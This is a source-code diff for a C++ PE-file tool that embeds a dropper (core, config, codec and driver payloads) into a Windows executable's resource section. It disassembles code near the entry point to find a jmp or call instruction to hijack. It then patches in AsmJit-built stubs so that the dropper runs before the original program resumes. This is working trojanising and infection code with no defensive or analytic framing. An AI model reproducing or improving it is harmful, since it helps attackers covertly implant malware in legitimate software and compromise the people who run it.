@@ -11,7 +11,6 @@ using namespace std;
 //#include <Wintrust.h>
 
 #include "../libs/AsmJit/AsmJit.h"
-#include "../libs/BeaEngine/BeaEngine.h"
 
 #include "DropperObject.h"
 #include "Exceptions.h"
@@ -941,68 +940,98 @@ IATEntry const & PEObject::getIATEntry( DWORD const rva )
 		throw IATEntryNotFound("No such entry.");
 }
 
-// XXX split disassemble and hooking
-// XXX hooking method: call (length 5)
-// XXX hooking method: call dword ptr (length 6)
-void PEObject::_disassembleCode(unsigned char *start, unsigned char *end, unsigned char* ep, int VA)
+void PEObject::_findHookableInstruction()
 {
-	DISASM _disasm;
-	
-	_disasm.EIP = (long long) ep;
-	_disasm.VirtualAddr = (long long) VA;
-	_disasm.Archi = 0;
-	_disasm.Options = MasmSyntax | NoTabulation | SuffixedNumeral | ShowSegmentRegs;
-	
-	_disasm.SecurityBlock = end - start;
-	long long startVA = VA - ((long) ep - (long) start);
-	long long endVA = startVA + ((long) end - (long) start);
-	
-	cout << "Disassembling 0x" << hex << startVA << " -> 0x" << hex << endVA << endl;
-	
 	// reset stage1 hook information
 	memset(&_hookPointer.stage1, 0, sizeof(_hookPointer.stage1));
 	
-	while (1) {
+	std::vector<disassembled_instruction>::iterator iter = instructions_.begin();
+	for (; iter != instructions_.end(); iter++) 
+	{
+		// hook jmp opcodes of length 5
+		disassembled_instruction instr = *iter;
+		switch (instr.d.Instruction.BranchType) {
+			case JmpType:
+				if (instr.len == STAGE1_STUB_SIZE) {
+					printf("\n");
+					printf("%.8X(%02d) %s\n",(int) instr.d.VirtualAddr, instr.len, &instr.d.CompleteInstr);
+					printf("!!! valid hook found at VA %08x\n", instr.d.VirtualAddr);
+					
+					hookedInstruction_ = instr;
+					_hookPointer.stage1.ptr = (char*) instr.d.EIP;
+					_hookPointer.stage1.va = instr.d.VirtualAddr;
+					_hookPointer.stage1.size = instr.len;
+					
+					return;
+				}
+				break;
+			case CallType:
+				if (instr.len == 6) {
+					printf("\n");
+					printf("%.8X(%02d) %s\n", (int)instr.d.VirtualAddr, instr.len, &instr.d.CompleteInstr);
+					printf("!!! potential hook found at VA %08x\n", instr.d.VirtualAddr);
+					printf("!!! displacement %08x\n", instr.d.Argument2.Memory.Displacement);
+					
+					hookedInstruction_ = instr;
+					_hookPointer.stage1.ptr = (char*) instr.d.EIP;
+					_hookPointer.stage1.va = instr.d.VirtualAddr;
+					_hookPointer.stage1.size = instr.len;
+
+					return;
+
+				}
+				break;
+		}
+		
+		(void) printf("\r%.8X(%02d) %s",(int) instr.d.VirtualAddr, instr.len, &instr.d.CompleteInstr);
+	}
+}
+
+// XXX split disassemble and hooking
+// XXX hooking method: call (length 5)
+// XXX hooking method: call dword ptr (length 6)
+void PEObject::_disassembleCode(unsigned char *start, unsigned char *end, int VA)
+{
+	disassembled_instruction instr;
+	instr.d.EIP = (long long) start;
+	instr.d.VirtualAddr = (long long) VA;
+	instr.d.Archi = 0;
+	instr.d.Options = MasmSyntax | NoTabulation | SuffixedNumeral | ShowSegmentRegs;
+	
+	instr.d.SecurityBlock = end - start;
+	long long endVA = VA + ((long) end - (long) start);
+	
+	printf("starting disassembling from VA %08x\n", instr.d.VirtualAddr);
+	
+	while (instr.d.EIP < (long)end) {
 		// disassemble current instruction
-		int len = Disasm(&_disasm);
+		printf("\rdisassembling %08x", instr.d.VirtualAddr);
+		
+		int len = Disasm(&instr.d);
+		instr.len = len;
+
 		if (len == OUT_OF_BLOCK || len == UNKNOWN_OPCODE)
 			return;
 		
-		// hook all branches of length 5 (jmp 32bit, call 32bit)
-		if (_disasm.Instruction.BranchType == JmpType && len == STAGE1_STUB_SIZE)
-		{
-			printf("%.8X(%02d) %s\n",(int) _disasm.VirtualAddr, len, &_disasm.CompleteInstr);
-			printf("!!! valid hook found at VA %08x\n", _disasm.VirtualAddr);
-			
-			_hookPointer.stage1.ptr = (char*) _disasm.EIP;
-			_hookPointer.stage1.va = _disasm.VirtualAddr;
-			
-			return;
-		}
-		
-		(void) printf("%.8X(%02d) %s\n",(int) _disasm.VirtualAddr, len, &_disasm.CompleteInstr);
+		instructions_.push_back(instr);
 		
 		// go to next instruction
-		_disasm.EIP = _disasm.EIP + len;
-		_disasm.VirtualAddr = _disasm.VirtualAddr + len;	
-		
-		// if we are over the intended buffer to disassemble, then quit
-		if (_disasm.EIP >= (long) end)  {
-			return;
-		}
+		instr.d.EIP = instr.d.EIP + len;
+		instr.d.VirtualAddr = instr.d.VirtualAddr + len;	
 	}
 	
-	return;
+	printf("\n");
 }
 
 bool PEObject::_parseText()
 {
-	unsigned char* ep = atRVA(epRVA());
-	GenericSection* section = findSection(epRVA());
-	// unsigned char * end = atRVAsection->VirtualAddress() + section->SizeOfRawData() - epRVA());
+	std::size_t decoded_size = 0x400;
+	unsigned char* start = atRVA(epRVA());
+	unsigned char* end = (unsigned char*) start + decoded_size;
+	instructions_.reserve(decoded_size);
 	
-	// _findCavities( section );
-	_disassembleCode( ep, (unsigned char*) ep + 0x400, ep, epVA() );
+	_disassembleCode( start, end, epVA() );
+	_findHookableInstruction();
 	
 	return true;
 }
@@ -1024,8 +1053,8 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 		throw std::exception("No valid hook location found.");
 	
 	// save original code for restoring stage1
-	dropper.setPatchCode(0, _hookPointer.stage1.va, _hookPointer.stage1.ptr, 5);
-		
+	dropper.setPatchCode(0, _hookPointer.stage1.va, _hookPointer.stage1.ptr, _hookPointer.stage1.size);
+	
 	if ( false == dropper.build(core, core64, config, codec, driver, driver64, installDir) )
 		throw std::exception("Dropper build failed.");
 	
@@ -1033,7 +1062,7 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	GenericSection* targetSection = getSection(IMAGE_DIRECTORY_ENTRY_RESOURCE);
 	if (!targetSection)
 		throw std::exception("Cannot find resource section.");
-
+	
 	// align size accounting for dropper size
 	std::size_t sectionSize = alignTo(alignToDWORD(targetSection->SizeOfRawData()) + alignToDWORD(dropper.size()), fileAlignment());
 	if (fixManifest)
@@ -1063,28 +1092,35 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 		+ dropper.epOffset();
 	cout << "*** ENTRY POINT VA 0x" << hex << epVA << endl;
 	
-	// fix restore stub
-	DWORD restoreVA =
+	// virtual address of the whole restore stub
+	DWORD stubVA =
 		ntHeaders()->OptionalHeader.ImageBase 
 		+ targetSection->VirtualAddress() 
 		+ dropperSkew 
-		+ dropper.restoreStubOffset();
+		+ dropper.restoreStubOffset()
+		;
+
+	// virtual address of the restore stub entry point
+	DWORD restoreVA = stubVA + sizeof(DWORD);
 	
-	cout << "*** RESTORE STUB VA 0x" << hex << restoreVA << endl;
+	cout << "*** RESTORE STUB located at VA 0x" << hex << stubVA << endl;
+	cout << "*** RESTORE STUB entry point at VA 0x" << hex << restoreVA << endl;
 	
 	// copy dropper
 	memcpy(ptr, dropper.data(), dropper.size());
 	
 	// prepare dropper call and restore stub
 	AsmJit::Assembler restoreStub;
-	restoreStub.pushfd();
+	
+	restoreStub.data(&restoreVA, sizeof(DWORD));
+	restoreStub.pushfd(); // restoreVA starts here
 	restoreStub.pushad();
-	restoreStub.call( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (epVA - restoreVA) );
+	restoreStub.call( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (epVA - stubVA) );
 	restoreStub.popad();
 	restoreStub.popfd();
-	restoreStub.sub( AsmJit::dword_ptr(AsmJit::esp, 0), 5 );
+	restoreStub.sub( AsmJit::dword_ptr(AsmJit::esp, 0), hookedInstruction_.len );
 	restoreStub.ret();
-		
+	
 	// install restore and call stub
 	restoreStub.relocCode( ptr + dropper.restoreStubOffset() );
 	
@@ -1127,7 +1163,20 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	// patch stubs code
 	cout << "Stage1 jumping to " << hex << restoreVA << dec << std::endl;
 	AsmJit::Assembler stage1stub;
-	stage1stub.call( ((DWORD)_hookPointer.stage1.ptr) + (restoreVA - _hookPointer.stage1.va) );
+	switch (hookedInstruction_.d.Instruction.BranchType) {
+		case JmpType:
+			{
+				DWORD addr = ((DWORD) hookedInstruction_.d.EIP) + (restoreVA - hookedInstruction_.d.VirtualAddr);
+				stage1stub.call( addr );
+			}
+			break;
+		case CallType:
+			{
+				//DWORD addr = ((DWORD) hookedInstruction_.d.EIP) + (stubVA - hookedInstruction_.d.VirtualAddr);
+				stage1stub.call( AsmJit::dword_ptr_abs((void*)stubVA) );
+			}
+			break;
+	}
 	stage1stub.relocCode( (void*) _hookPointer.stage1.ptr );
 	
 	return true;
